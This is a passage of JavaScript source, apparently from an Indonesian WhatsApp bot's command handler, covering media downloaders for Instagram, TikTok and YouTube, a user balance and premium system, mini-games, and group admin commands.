		if (isCmd && !isGroup) console.log(color('[CMD]','magenta'), color(moment(Ofc.messageTimestamp * 1000).format('DD/MM/YYYY | HH:mm:ss'), 'white'), color(`${command}`,'magenta'), 'from', color(`${pushname}`))
					if (isCmd && isGroup){
						console.log(color('[CMD]','magenta'), color(moment(Ofc.messageTimestamp * 1000).format('DD/MM/YYYY | HH:mm:ss'), 'white'), color(`${command}`,'magenta'), 'from', color(`${pushname}`), 'in', color(groupName,'magenta'))
						addBalance(sender, randomNomor(20), balance)
					}	
		if (!Ofc.key.fromMe && !isOwner && !isCreator && public_mode === true ) return
					/*if (!isGroup && !isCmd && !command && !Ofc.key.fromMe && autorespon) {
simi = await fetchJson(`https://api.simsimi.net/v2/?lc=ind&cf=false&text=${cmd}`)
                     sami = simi.success
                        Zeeone.sendMessage(from, `_${sami}_`, text, {thumbnail: thumbnail, sendEphemeral: true, quoted: Ofc, contextInfo : {forwardingScore: 508, isForwarded: true}})
                      }*/
                      if (autoregister){
if (autoregister === false) return
let gaklopo = [{
										"buttonId": `verify`,
										"buttonText": {
											"displayText": "VERIFY"
											},
										"type": "RESPONSE"
										},{
										"buttonId": `register off`,
										"buttonText": {
											"displayText": "MODE VERIFY OFF"
											},
										"type": "RESPONSE"
										}]
if (isCmd && !isOwner && !isCreator && !Ofc.key.fromMe && !isUser) return sendButMessage(from, `Hi @${sender.split('@')[0]} kamu belum terdaftar di dalam database. Silahkan verifikasi akun kamu terlebih dahulu dengan cara ketik @verif atau tekan button di bawah.`, `${namabot}™© | ${owner_name}`, gaklopo, {quoted: Ofc, contextInfo: { mentionedJid: [sender]}})

}
					switch(command){
						case "colongsw": 
        if (!Ofc.key.fromMe) return
        if ((isMedia && !Ofc.message.videoMessage) || isQuotedImage) {
          ger = isQuotedImage
            ? JSON.parse(JSON.stringify(mek).replace("quotedM", "m")).message
                .extendedTextMessage.contextInfo
            : Ofc;
          owgi = await Zeeone.downloadAndSaveMediaMessage(ger);
          Zeeone.sendMessage(sender, fs.readFileSync(owgi), "imageMessage", {
            caption: q,
          });
          reply("Sukses");
          fs.unlinkSync(owgi);
        } else if ((isMedia && !Ofc.message.videoMessage) || isQuotedVideo) {
          ger = isQuotedVideo
            ? JSON.parse(JSON.stringify(Ofc).replace("quotedM", "m")).message
                .extendedTextMessage.contextInfo
            : Ofc;
          owgi = await Zeeone.downloadAndSaveMediaMessage(ger);
          Zeeone.sendMessage(sender, fs.readFileSync(owgi), "videoMessage", {
            caption: q,
          });
          reply("Sukses");
          fs.unlinkSync(owgi);
        } else {
          reply("Reply sw foto / video yg mau dicolong")
        }
        break
						case 'on':
		            if (!Ofc.key.fromMe && !isOwner) return 
		            offline = false
		            reply('Owner saya telah on kembali')
		            break       
		    case 'status':
		            reply(`*STATUS*\n${offline ? '> OFFLINE' : '> ONLINE'}`)
		            break
		    case 'off':
		            if (!Ofc.key.fromMe && !isOwner) return 
		            offline = true
		            waktu = Date.now()
		            anuu = args.join(' ') ? args.join(' ') : '-'
		            alasan = anuu
		            reply('Owner saya telah off')
		            break   
						case 'igstory': case 'instastory':  case 'instagramstory': 
            if(!q) return reply('Usernamenya?')
            pape = q
            hx.igstory(pape)
            .then(async result => {
            	 for(let i of result.medias){
            	if(i.url.includes('mp4')){
                    let link = await getBuffer(i.url)
                    Zeeone.sendMessage(from,link,video,{thumbnail: Buffer.alloc(0), quoted: Ofc,caption: `Instagram • ${i.type}`})
                } else {
                    let link = await getBuffer(i.url)
                    Zeeone.sendMessage(from,link,image,{thumbnail: Buffer.alloc(0), quoted: Ofc,caption: `Instagram • ${i.type}`})                  
                }
            }
            }).catch((err) => reply(`Terjadi kesalahan atau mungkin user private`))
            break
						case 'ig': case 'igdl': case 'igphoto': case 'instaphoto': case 'instafoto': case 'igfoto': case 'igvideo': case 'instavideo': case 'instavid': case 'igreels': case 'instareels': case 'instareel': case 'igtv': case 'instatv':
		if (!isUrl(args[0]) && !args[0].includes('instagram.com')) return reply(mess.errorLink)
		let urlnya = q
hx.igdl(urlnya)
	    .then(async(result) => {
for(let i of result.medias){
                if(i.url.includes('mp4')){
                    let link = await getBuffer(i.url)
                    Zeeone.sendMessage(from,link,video,{thumbnail: Buffer.alloc(0), quoted: Ofc,caption: `Instagram •  ${i.type}`})
                } else {
                    let link = await getBuffer(i.url)
                    Zeeone.sendMessage(from,link,image,{thumbnail: Buffer.alloc(0), quoted: Ofc,caption: `Instagram • ${i.type}`})                  
                }
            }
            }).catch((err) => reply(`Link tidak valid atau mungkin user private`))
            break
            case 'pinterest': case 'pinterest2':
if(!q) return reply('Masukkan query lord')
            async function pinterestSearch(query) {
                    return new Promise((resolve, reject) => {
                        fetch(`https://www.pinterest.com/resource/BaseSearchResource/get/?source_url=%2Fsearch%2Fpins%2F%3Fq%3D${query}&data=%7B%22options%22%3A%7B%22isPrefetch%22%3Afalse%2C%22query%22%3A%22${query}%22%2C%22scope%22%3A%22pins%22%2C%22no_fetch_context_on_resource%22%3Afalse%7D%2C%22context%22%3A%7B%7D%7D&_=1619980301559`, {
                            "headers": {
                                "accept": "application/json, text/javascript, */*, q=0.01",
                                "accept-language": "en-US,en;q=0.9",
                                "cache-control": "no-cache",
                                "pragma": "no-cache",
                                "sec-fetch-dest": "empty",
                                "sec-fetch-mode": "cors",
                                "sec-fetch-site": "same-origin",
                                "sec-gpc": "1",
                                "x-app-version": "9a236a4",
                                "x-pinterest-appstate": "active",
                                "x-requested-with": "XMLHttpRequest"
                            },
                            "referrer": "https://www.pinterest.com/",
                            "referrerPolicy": "origin",
                            "body": null,
                            "method": "GET",
                            "mode": "cors"
                        }).then((res) => res.json())
                            .then((json) => {
                                const generatepin = json.resource_response.data.results[Math.floor(Math.random() * (json.resource_response.data.results.length))]
                                var result = [];
                                result.push({
                                    link: generatepin.images.orig.url
                                })
                                resolve(result)
                            }).catch(reject)
                    })
                }

                const pinterest = (query) => new Promise((resolve, reject) => {
                    pinterestSearch(query).then((data) => {
                        resolve({
                            status: 200,
                            image: data[0].link
                        })
                    }).catch(reject)
                })

                pinterest(q).then(async(res) => {
                	let we = await getBuffer(res.image)
                    Zeeone.sendMessage(from, we, MessageType.image, {caption: `Hasil Pencarian: ${q}`, quoted: Ofc, thumbnail:Buffer.alloc(0)})
                }).catch(async(err) => {
                    reply('Terjadi kesalahan')
                })
                break
            case 'allmenu': case 'help': case 'menu':
									ihsh = `${owner_number}@s.whatsapp.net`
									let cekvipp = ms(premium.getPremiumExpired(sender,premium) - Date.now())
									let gaklo = [{
										"buttonId": `mystat`,
										"buttonText": {
											"displayText": "✓ STATICTIC"
											},
										"type": "RESPONSE"
										},{
										"buttonId": `sewabot`,
										"buttonText": {
											"displayText": "⎙ SEWABOT"
											},
										"type": "RESPONSE"
										}]
										sendButLocation(from, menubot.allmenu(namabot, pushname, sender, isOwner, isPremium, cekvipp, getLimit, limitawal,limit, balance, getBalance, simbolnya, petik, prefix), `Total hit : ${hitall}${enter}Hit today : ${hit_today.length}${enter}${enter}${namabot}™© | ${owner_name}`, thumbnail, gaklo, {contextInfo: { mentionedJid: [sender]}})
										break
						}
						
					switch (command) {
							case 'verify': case 'daftar':
										if (isUser) return reply('Kamu sudah terdaftar di dalam database')
										addRegisterUser(sender, pushname, bio_user, wib)
										let ran_blc = randomNomor(50)
										addBalance(sender, ran_blc, balance)
										fs.writeFileSync('./database/user.json', JSON.stringify(_user))
										teks = `╭─❒ *Verification* ❒\n│📛 *Nama :* ${pushname}\n│#️⃣ *Nomor :* @${sender.split('@')[0]}\n│💌 *Bio :* ${bio_user}\n│⏰ *Time :* ${wib} Wib\n╰❒ *Success*`
										let papako = [{
											"buttonId": `menu`,
											"buttonText": {
												"displayText": "MENU"
												},
												"type": "RESPONSE"
												},{
													"buttonId": `me`,
													"buttonText": {
														"displayText": "PROCFILE"
														},
														"type": "RESPONSE"
													}]
											sendButLocation(from, teks , `Thank for verification 💋\n${namabot}™© | By ${owner_name}`, thumbnail, papako, {contextInfo: { mentionedJid: [sender]}})
									break
						case 'autoregis': case 'register':
									if (!Ofc.key.fromMe && !isOwner && !isCreator) return reply(mess.only.owner)
									if (args[0] === "on") {
										if (autoregister === true) return reply(`Mode ${command} telah aktif sebelumnya`)
										autoregister = true
										reply(`${command} di aktifkan`)
										} else if (args[0] === "off") {
											if (autoregister === false) return
											autoregister = false
											reply(`${command} telah dinonaktifkan`)
											} else if (!q) {
												sendButMessage(from, `MODE AUTO REGISTER`, `Choose one`, [
												{
													buttonId: 'register on',
													buttonText: {
														displayText: `On`,
														},
														type: 1,
														},
														{
															buttonId: 'register off',
															buttonText: {
																displayText: `Off`,
																},
																type: 1,
																},
																]);
															}
									break;
						case 'autorespon': case 'autorespond':
									if (!isOwner && !isCreator && !Ofc.key.fromMe) return reply(mess.only.owner)
									if (q === 'on'){
										if (autorespon === true) return reply(`${command} telah aktif sebelumnya`)
										autorespon = false
										reply(`${command} di aktifkan`)
										} else if (q === 'off'){
											if (autorespon === false) return
											autorespon = true
											reply(`${command} telah dinonaktifkan`)
											} else if (!q) {
												sendButMessage(from, `MODE AUTO RESPON`, `Choose one`, [
												{
													buttonId: 'autorespon on',
													buttonText: {
														displayText: `On`,
														},
														type: 1,
														},
														{
															buttonId: 'autorespon off',
															buttonText: {
																displayText: `Off`,
																},
																type: 1,
																},
																]);
															}
									break;
						case 'public':
									if (!Ofc.key.fromMe && !isOwner) return reply(mess.only.owner)
									if (public_mode === false) return
									public_mode = false
									sendButMessage(from, `「 *PUBLIC-MODE* 」`, `Click self to return to self mode`, [
									{
										buttonId: `self`,
										buttonText: {
											displayText: `Self Mode`,
											},
											type: 1,
											}]);
									break;
						case 'self':
									if (!Ofc.key.fromMe && !isOwner) return reply(mess.only.owner)
									if (public_mode === true) return
									public_mode = true
									sendButMessage(from, `「 *SELF-MODE* 」`, `Click public to return to public mode`, [
									{
										buttonId: `public`,
										buttonText: {
											displayText: `Public Mode`,
											},
											type: 1,
											}]);
									break;
						case 'topbalance':
									if(!isGroup)return reply(mess.only.group)
									let txot = `*── 「 TOP BALANCE 」 ──*\n\n`
									let mebn = [];
									for (let i of balance){
										mebn.push(i.id)
										let bl = (i.balance)
										txot += `🆔 *ID :* @${i.id.split("@")[0]}\n💹 *Balance :* ${bl}\n\n`
										}
									mentions(txot, mebn, true)
									break
						case 'toplimit':{
									if(!isGroup)return reply(mess.only.group)
									let txot = `*── 「 TOP  LIMIT 」 ──*\n\n`
									let mebn = [];
									for (let i of limit){
										mebn.push(i.id)
										let bl = (i.limit)
										txot += `🆔 *ID :* @${i.id.split("@")[0]}\n📊 *Limit :* ${bl}\n\n`
									}
									mentions(txot, mebn, true)
									}
									break
						case 'bal': case 'limit': case 'ceklimit': case 'balance': 
									reply(`*${ucapannya} @${sender.split("@")[0]}* 

*🌐 Limit : ${isPremium ? 'Unlimited Premium' : `${getLimit(sender, limitawal, limit)} / ${limitawal}`}*
*💹 Balance : $${getBalance(sender, balance)}*


Kamu Dapat Membeli Limit Dengan ${prefix}Buylimit *Nominal*

*Example :*
${prefix}buylimit 10

NOTE : 
- Harga Limit Perlimit adalah $100 balance`)
									break
						case 'level':{
									reply(`@${sender.split("@")[0]}

*📊 Level : ${getLevelingLevel(sender)}*
*🎯 Xp : ${getLevelingXp(sender)}*`)
}
									break
						case 'giftlimit': case 'givelimit':
									if (isPremium) return reply(`User Premium Tidak Bisa Melakukan Gift Limit Lord`)
									if (!isGroup) return reply(mess.only.group)
									if (!q.includes('|')) return  reply(`Contoh ${prefix + command} _@user | Nominal_`)
									const tujuan = q.substring(0, q.indexOf('|') - 1)
									const jumblah = q.substring(q.lastIndexOf('|') + 1)
									if(isNaN(jumblah)) return await reply('Jumlah Harus Berupa Angka Lord')
									if (jumblah < 1 ) return reply(`minimal transfer 1`)
									if (getLimit(sender, limitawal, limit) < jumblah) return reply(`Limit Mu Tidak Mencukupi Untuk Melakukan Gift Limit`)
									const tujuantf = `${tujuan.replace("@","")}@s.whatsapp.net`
									hasiltf = jumblah
									giveLimit(tujuantf, hasiltf, limit)
									beliprem(sender, jumblah)
									reply(`─ 「 *SUKSES* 」 ─

SUKSES TRANSFER LIMIT

🆔 *Pengirim :* @${sender.split("@")[0]}
📛 *Penerima :* ${tujuan}
💹 *Jumlah Limit :* ${jumblah}

Example : 
${prefix}giftlimit @user | 10 

*NOTE :*
Pastikan Transfer Limit Benar`)
									break 
						case 'buyprem': case 'beliprem':
									if (isPremium) return reply('Loe Dah Prem Cuy')
									if (getLimit(sender, limitawal, limit) < 1000) return reply(`Limitmu Tidak Cukup.\nDi Perlukan 1000 Limit Untuk Menjadi User Premium Trial 3 Hari`)
									premium.addPremiumUser(`${sender}`, `3d`, premium)
									sendButMessage(from, `*Sekarang Akun Anda Telah Premium*`, `Klik Untuk Mengecek Waktu Expired`, [
									{
										buttonId: `cekprem`,
										buttonText: {
											displayText: `🔖 CEK PREMIUM`,
											},
											type: 1,
											}]);
									beliprem(sender, 1000)
									break
						case 'buylimit':{
									if (!q) return reply(`Kirim perintah *${prefix}buylimit* jumlah limit yang ingin dibeli\n\nHarga 1 limit = $100 balance`)
									if (q.includes('-')) return reply(`Jangan menggunakan -`)
									if (isNaN(q)) return reply(`Harus berupa angka`)
									let ane = Number(nebal(q) * 100)
									if (getBalance(sender, balance) < ane) return reply(`Balance kamu tidak mencukupi untuk pembelian ini`)
									kurangBalance(sender, ane, balance)
									giveLimit(sender, nebal(q), limit)
									reply(`Pembeliaan limit sebanyak ${q} berhasil

*📊 Sisa Balance : ${getBalance(sender, balance)}*
*💹 Sisa Limit : ${getLimit(sender, limitawal, limit)} / ${limitawal}*`)
}
									break
						case 'playstore': 
									if(!q) return reply('Mau cari apa lord')
									reply(mess.wait)
									let play = await hx.playstore(q)
									let store = `*「 PLAY STORE 」*\n\n*Hasil Pencarian Dari : ${q}*`
									for (let i of play){
										store += `🆔 *Nama* : ${i.name}
🎯 *Link* : ${i.link}\n
👨‍💻 *Dev* : ${i.developer}
🌝 *Link Dev* : ${i.link_dev}
`
}
									reply(store)
									break
						case 'mediafire':
									if (!isPremium) return reply(mess.only.prem)
									if (args.length < 1) return reply('Masukkan link mediafire')
									if(!isUrl(args[0]) && !args[0].includes('mediafire')) return reply('Linknya Error')
									reply(mess.wait)
									teks = args.join(' ')
									res = await mediafireDl(teks)
									result = ` *MEDIAFIRE DOWNLOAD*

*Data Berhasil Didapatkan!*

🆔 Nama : ${res[0].nama}
📊 Ukuran : ${res[0].size}
💬 Link : ${res[0].link}

_Tunggu Proses Upload Media_`
									reply(result)
									mdf = await getBuffer(res[0].link)
									Zeeone.sendMessage(from, mdf, document, {mimetype: res[0].mime, filename: res[0].nama, quoted: Ofc})
									break
						case 'tiktoknowm':   case 'tiktok':
									if (!q) return reply('Linknya?')
									if (!isUrl(args[0]) && !args[0].includes('tiktok.com')) return reply('Invalid link')
									reply(mess.wait)
									let nowem = q
									hx.ttdownloader(nowem)
									.then(result => {
										const { wm, nowm, audio } = result
										axios.get(`https://tinyurl.com/api-create.php?url=${nowm}`)
										.then(async (a) => {
											me = `*Link* : ${a.data}`
											noweem = await getBuffer(nowm)
											Zeeone.sendMessage(from,noweem , MessageType.document, {mimetype: 'video/mp4',filename: `Tiktok Download.mp4`,quoted:Ofc})
											})
										}).catch((err) => reply(`Link tidak valid`))
									break 
						case 'tiktokwm':
									if (!q) return reply('Linknya?')
									if (!isUrl(args[0]) && !args[0].includes('tiktok.com')) return reply('Invalid link')
									reply(mess.wait)
									let wem = q
									hx.ttdownloader(wem)
									.then(result => {
										const { wm, nowm, audio } = result
										axios.get(`https://tinyurl.com/api-create.php?url=${nowm}`)
										.then(async (a) => {
											me = `*Link* : ${a.data}`
											weem = await getBuffer(wm)
											Zeeone.sendMessage(from,weem , MessageType.document, {mimetype: 'video/mp4',filename: `Tiktok Wm.mp4`,quoted:Ofc})
											})
										}).catch((err) => reply(`Link tidak valid`))
									break 
						case 'tiktokmusic': case 'tiktokaudio':  
									if (!q) return reply('Linknya?')
									if (!isUrl(args[0]) && !args[0].includes('tiktok.com')) return reply('Invalid Link')
									reply(mess.wait)
									let audi = q
									hx.ttdownloader(audi)
									.then(result => {
										const { wm, nowm, audio } = result
										axios.get(`https://tinyurl.com/api-create.php?url=${audio}`)
										.then(async (a) => {
											audnha = await getBuffer(audio)
											Zeeone.sendMessage(from,audnha , MessageType.document, {mimetype: 'audio/mp4',filename: `Tiktok Music.mp3`,quoted:Ofc})
											})
										}).catch((err) => reply(`Link tidak valid`))
									break
						case 'playvideo': case 'video':{
									if (!q) return reply(`Example : ${prefix+command} query`)
									reply(mess.wait)
									try {
										var srch = args.join(' ')
										let yut = await yts(srch)
										aramat = yut.all 
										var mulaikah = aramat[0].url          
										server ='en68'
										ytv2(mulaikah, server)
										.then((res) => {
											const { dl_link, thumb, title, filesizeF, filesize } = res
											axios.get(`https://tinyurl.com/api-create.php?url=${dl_link}`)
											.then((a) => {
												if (Number(filesize) >= 40000) return Zeeone.sendMessage(from, `*─ 「 YOUTUBE VIDEO 」─*\n\n*▢ Title :* ${title}\n*▢ Filesize :* ${filesizeF}\n*▢ Upload :* ${yut.videos[0].ago}\n*▢ Ditonton :* ${yut.videos[0].views}\n*▢ Duration :* ${yut.videos[0].timestamp}\n\n\`\`\`Ukuran File Terlalu Besar Jadi Di Sajikan Dalam Bentuk Link\`\`\``, text, {quoted : Ofc})
												Zeeone.sendMessage(from, thumb, image, {caption: `─ 「 YOUTUBE VIDEO 」─\n\n*▢ Title :* ${title}\n*▢ Filesize :* ${filesizeF}\n*▢ Upload :* ${yut.videos[0].ago}\n*▢ Ditonton :* ${yut.videos[0].views}\n*▢ Duration :* ${yut.videos[0].timestamp}\n*▢ LINK :* ${yut.videos[0].url}\n\n\`\`\`Tunggu Sebentar, Video Sedang Dikirim\`\`\``, quoted : Ofc})
												sendFileFromUrl(dl_link, video, {mimetype: 'video/mp4',quoted:Ofc})
												})
												})
												} catch (err) {
													console.log('Error : %s', color(err, 'red'))
													reply(`ERROR`)
												}
											}
									break
					 case 'ytmp4': case 'ytvideo':{
									if (!q) return reply(`Example : ${prefix+command} https://youtu.be/kxjMsMST4Rw`)
									let isLinks = args[0].match(/(?:https?:\/{2})?(?:w{3}\.)?youtu(?:be)?\.(?:com|be)(?:\/watch\?v=|\/)([^\s&]+)/)
									if (!isLinks) return reply('Eror')
									reply(mess.wait)
									var srch = args.join(' ')
									aramas = await yts(srch);
		  	 					 server = 'en68'
						            aramat = aramas.all 
						            var mulaikah = aramat[0].url                            
		                  try {
		                    ytv2(mulaikah, server)
		                    .then((res) => {
		                        const { dl_link, thumb, title, filesizeF, filesize } = res
		                        axios.get(`https://tinyurl.com/api-create.php?url=${dl_link}`)
		                        .then(async (a) => {
		                        if (Number(filesize) >= 100000) return sendMediaURL(from, thumb, `*📩 YOUTUBE-PLAY MP4*${enter}${enter}🐣 *Title* : ${title}${enter}📊 *Quality :* 480kbps${enter}⛎ *Ext* : MP3${enter}♏ *Filesize* : ${filesizeF}${enter}🔗 *Link* : ${a.data}${enter}${enter}_Untuk durasi lebih dari batas disajikan dalam bentuk link_`)
		                        sendMediaURL(from, dl_link, `*📩 YOUTUBE-PLAY MP4*${enter}${enter}🐣 *Title* : ${title}${enter}📊 *Quality :* 480kbps${enter}⛎ *Ext* : MP3${enter}♏ *Filesize* : ${filesizeF}${enter}🔗 *Link* : ${a.data}`).catch(e => {reply('Emror')})
		                       })
		                        })
		                        } catch (err) {
		                        reply(mess.error)
		                        }
							}
		                   break      
						case 'play': case 'song':
									if (args.length === 0) return reply(`Kirim perintah *${prefix}play* _Judul lagu yang akan dicari_`)
									var srch = args.join(' ')
									aramas = await yts(srch);
									aramat = aramas.all 
									var mulaikah = aramat[0].url
									try {
										yta2(mulaikah, 'en68')
										.then((res) => {
											const { dl_link, thumb, title, filesizeF, filesize } = res
											axios.get(`https://tinyurl.com/api-create.php?url=${dl_link}`)
											.then(async (a) => {
												if (Number(filesize) >= 100000) return sendMediaURL(from, thumb, `*PLAY MUSIC*\n\n*Title* : ${title}\n*Ext* : MP3\n*Filesize* : ${filesizeF}\n*Link* : ${a.data}\n\n_Untuk durasi lebih dari batas disajikan dalam bentuk link_`)
												const captions = `🎧 *PLAY MUSIC*\n\n*Title* : ${title}\n*Ext* : MP3\n*Size* : ${filesizeF}\n*Link* : ${a.data}\n\n_Silahkan tunggu file media sedang dikirim mungkin butuh beberapa menit_`
												await sendMediaURL(from, thumb, captions)
												sendMediaURL(from, dl_link).catch(() => reply('error'))
												}) 
											})
										} catch (err) {
											reply('Terjadi kesalahan')
											}
									break
						case 'ytmp3':
									if (args.length === 0) return reply(`Kirim perintah *${prefix}play* _url_`)
									let isLinks = args[0].match(/(?:https?:\/{2})?(?:w{3}\.)?youtu(?:be)?\.(?:com|be)(?:\/watch\?v=|\/)([^\s&]+)/)
									if (!isLinks) return reply('Eror')
									var srch = args.join(' ')
									try {
										yta2(srch, 'en68')
										.then((res) => {
											const { dl_link, thumb, title, filesizeF, filesize } = res
											axios.get(`https://tinyurl.com/api-create.php?url=${dl_link}`)
											.then(async (a) => {
												if (Number(filesize) >= 100000) return sendMediaURL(from, thumb, `*PLAY MUSIC*\n\n*Title* : ${title}\n*Ext* : MP3\n*Filesize* : ${filesizeF}\n*Link* : ${a.data}\n\n_Untuk durasi lebih dari batas disajikan dalam bentuk link_`)
												const captions = `🎧 *PLAY MUSIC*\n\n*Title* : ${title}\n*Ext* : MP3\n*Size* : ${filesizeF}\n*Link* : ${a.data}\n\n_Silahkan tunggu file media sedang dikirim mungkin butuh beberapa menit_`
												await sendMediaURL(from, thumb, captions)
												sendMediaURL(from, dl_link).catch(() => reply('error'))
												}) 
											})
										} catch (err) {
											reply('Terjadi kesalahan')
											}
									break
						case 'ytsearch': case 'yts':
					if (args.length < 1) return reply('Tolong masukan query!')
					var srch = args.join(' ');
					try {
		        	var aramas = await yts(srch);
		   			} catch {
		        	return await Zeeone.sendMessage(from, 'Error!', MessageType.text, dload)
		    		}
		    		aramat = aramas.all 
		    		var tbuff = await getBuffer(aramat[0].image)
		    		var ytresult = '';
		    		ytresult += '「 *YOUTUBE SEARCH* 」'
		    		ytresult += '\n________________________\n\n'
		   			aramas.all.map((video) => {
		        	ytresult += '🐣 Title: ' + video.title + '\n'
		            ytresult += '🐣 Link: ' + video.url + '\n'
		            ytresult += '🐣 Durasi: ' + video.timestamp + '\n'
					ytresult += '🐣 Views: ' + video.views + '\n'
		            ytresult += '🐣 Upload: ' + video.ago + '\n________________________\n\n'
		    		});
		    		ytresult += '*WHATSAPP-BOT*'
		    		await Zeeone.sendMessage(from, tbuff, image, {quoted : Ofc, caption: ytresult})
					break
						case 'wiki': case 'wikipedia':
									if (args.length < 1) return reply(' Yang Mau Di Cari Apa Lord? ')
									reply(mess.wait)
									teks = args.join(' ')
									res = await wikiSearch(teks).catch(e => {
										return reply('Error Hasil Tidak Ditemukan') 
										}) 
										result = `*JUDUL :* ${res[0].judul}\n*WIKI :* ${res[0].wiki}`
										sendFileFromUrl(res[0].thumb, image, {quoted: Ofc, caption: result}).catch(e => {
											reply(result)
										})
									break
						case 'waifu': case 'shinobu': case 'megumin': case 'bully': case 'cuddle': case 'cry': case 'hug': case 'awoo': case 'kiss': case 'lick': case 'pat': case 'smug': case 'bonk': case 'yeet': case 'blush': case 'smile': case 'wave': case 'highfive': case 'handhold': case 'nom': case 'bite': case 'glomp': case 'slap': case 'kill': case 'happy': case 'wink': case 'poke': case 'dance': case 'cringe': 
              reply(mess.wait)
              let waifu = await fetchJson(`https://api.waifu.pics/sfw/${command}`)
                await sendFileFromUrl(from,waifu.url,`${command}`,Ofc)
                .catch((err) => {
                    reply('Terjadi kesalahan')
                })
		break
            case 'loli': case 'neko': 
              reply(mess.wait)
              let loli = await fetchJson(`https://api.waifu.pics/sfw/neko`)
              await sendFileFromUrl(from,loli.url,`${command}`,Ofc)
                .catch((err) => {
                       reply('Terjadi kesalahan')
                })
		break
						case 'asupan':{
									if (isLimit(sender, isPremium, isOwner, limitawal, limit)) return reply(mess.limit)
									reply(mess.wait)
									data = fs.readFileSync('./lib/asupan.js');
									jsonData = JSON.parse(data);
									randIndex = Math.floor(Math.random() * jsonData.length);
									randKey = jsonData[randIndex];
									let kdkp = await getBuffer(randKey.result)
									Zeeone.sendMessage(from, kdkp, video, { quoted:  Ofc, mimetype: 'video/mp4', caption: 'Asupan Lord'})
									limitAdd(sender, limit)
									}
									break
						case 'delete': case 'del': case 'd':
									if (!Ofc.key.fromMe && !isGroupAdmins && !isOwner)return reply(mess.only.admin)
									if (!isQuotedReply) return reply(`Reply pesan dari bot!!`)
									Zeeone.deleteMessage(from, { id: Ofc.message.extendedTextMessage.contextInfo.stanzaId, remoteJid: from, fromMe: true })
									break
						case 'afk':
									if (!isGroup) return reply(mess.only.group)
									if (isAfkOn) return reply('Kamu dalam mode afk Lord')
									let reason = body.slice(5) ? body.slice(5) : 'Nothing.'
									afk.addAfkUser(sender, Date.now(), reason, _afk)
									mentions(`─「 *AFK MODE* 」─

@${sender.split('@')[0]} sedang afk!
Alasan : ${reason}`, [sender], true)
									break
						case 'delvote': case 'dellvote':
									if (!Ofc.key.fromMe && !isGroupAdmins && !isOwner) return reply(mess.only.admin)
									if (!isVote) return reply('Tidak ada sesi Voting')
									delVote(from)
									reply('Sukses Menghapus sesi Voting Di Grup Ini')
									break
						case 'voting': case 'vote':
									if (!isGroupAdmins && !isOwner) return reply(mess.only.admin)
									if (!isGroup) return reply(mess.only.group)
									if (isVote) return reply('Sesi Voting Sedang Berlangsung Di Grup Ini')
									if (!q) return reply(`*Example :*\n ${prefix + command} @tag target | reason| 1 (1 = 1 Menit)`)
									if (Ofc.message.extendedTextMessage.contextInfo.mentionedJid.length > 0 || Ofc.message.extendedTextMessage.contextInfo == null) {
										let id = Ofc.message.extendedTextMessage.contextInfo.mentionedJid[0]
										split = args.join(' ').replace('@', '').split('|')
										if(!Number(split[2])) return reply('masukan angka di baris ke 3\nContoh: 1-9999\n1 = 1 Menit')
										await mentions('Vote ' +'@'+ id.split('@')[0]+' Di Mulai!' +'\n\n' + `vote = ✅\ndevote = ❌\n\nAlasan: ${split[1]}`,[id],true)
										addVote(from,split[1],split[0],split[2],reply)
									}
									break
						case 'tictactoe': case 'ttt':
									if (!isGroup)return reply('*Khusus group*')
									if (Ofc.message.extendedTextMessage.contextInfo.mentionedJid > 1) return reply('Hanya bisa dengan 1 orang')
									if (!Ofc.message.extendedTextMessage.contextInfo.mentionedJid[0]) return
									if (fs.existsSync(`./database/user/${from}.json`)) return reply(`Sedang Ada Sesi, tidak dapat dijalankan secara bersamaan${enter}Ketik *${prefix}delsesi ttt*, untuk menghapus sesi`)
									if (args.length === 0) return reply(`Tag Lawan Yang Ingin Diajak Bermain Game`)
									tttSkuy = setTtt(`${from}`)
									tttSkuy.status = false
									tttSkuy.Z = sender.replace("@s.whatsapp.net", "")
									tttSkuy.Y = args[0].replace("@", "");
									fs.writeFileSync(`./database/user/${from}.json`, JSON.stringify(tttSkuy, null, 2))
									starGame = `「 *MEMULAI GAME TICTACTOE* 」${enter}${enter}•@${sender.replace("@s.whatsapp.net", "")} Menantang Bermain Tictactoe ${enter}[ ${args[0]} ] Ketik Y/N untuk menerima atau menolak permainan${enter}${enter}`
									Zeeone.sendMessage(from, starGame, text, {quoted: Ofc, contextInfo: { mentionedJid: [sender, args[0].replace("@", "") + "@s.whatsapp.net"],}})
									break
						case 'sewabot': 
									let gakloo = [{
										"buttonId": `owner`,
										"buttonText": {
											"displayText": "OWNER"
											},
										"type": "RESPONSE"
										},{
										"buttonId": `donasi`,
										"buttonText": {
											"displayText": "DONASI"
											},
										"type": "RESPONSE"
										}]
										sendButLocation(from, sewabotkak(), `Sewa bot om?`,  thumbnail, gakloo,{})
										break
						case 'donasi':
									reply('Isi sendiri')
									break
						case 'join':case 'joingc':
									if (!q) return reply('Linknya?')
									if (!Ofc.key.fromMe && !isOwner) return reply(mess.only.owner)
										if (!isUrl(args[0]) && !args[0].includes('https://chat.whatsapp.com/')) return reply('Linknya Invalid Lord')
										reply('Tunggu Sebentar Otw Masuk Group')
										link = args[0].replace('https://chat.whatsapp.com/','')
										fak = Zeeone.query({ json: ['action', 'invite', link],
										expect200: true })
										reply('Berhasil Masuk Grup')
									break
						case 'kick': case 'headsot':
									if (!isGroup) return reply(mess.only.group)
									if (!isGroupAdmins && !isOwner && !Ofc.key.fromMe) return reply(mess.only.admin) 
									if (!isBotGroupAdmins) return reply(`Jadikan Bot Sebagai Admin Group!`)
									kick(from, mentionUser)
									break
						case 'revoke': case 'resetlinkgc': case 'resetlink':
									if (!isGroup) return reply(mess.only.group)
									if (!isGroupAdmins && !isOwner && !Ofc.key.fromMe) return reply(mess.only.admin) 
									if (!isBotGroupAdmins) return reply(`Jadikan Bot Sebagai Admin Group!`)
									Zeeone.query({ json: ['action', 'inviteReset', from], expect200: true })
									reply(`Sukses Reset Link Group!`)
									break
						case 'linkgc': case 'gclink': case 'linkgrup': case 'linkgroup': case 'grouplink':
									if (!isGroup) return reply(mess.only.group)
									if (!isGroupAdmins && !isOwner && !Ofc.key.fromMe) return reply(mess.only.admin)   
									if (!isBotGroupAdmins) return reply(`Jadikan Bot Sebagai Admin Group!`)
									linkgc = await Zeeone.groupInviteCode (from)
									yeh = `*https://chat.whatsapp.com/${linkgc}*`
									Zeeone.sendMessage(from, {text: yeh,
									matchedText: 'https://chat.whatsapp.com/' + linkgc, 
									canonicalUrl: `https://chat.whatsapp.com/${linkgc}`, 
									description: `https://chat.whatsapp.com/${linkgc}`, 
									title: `${groupName}`, 
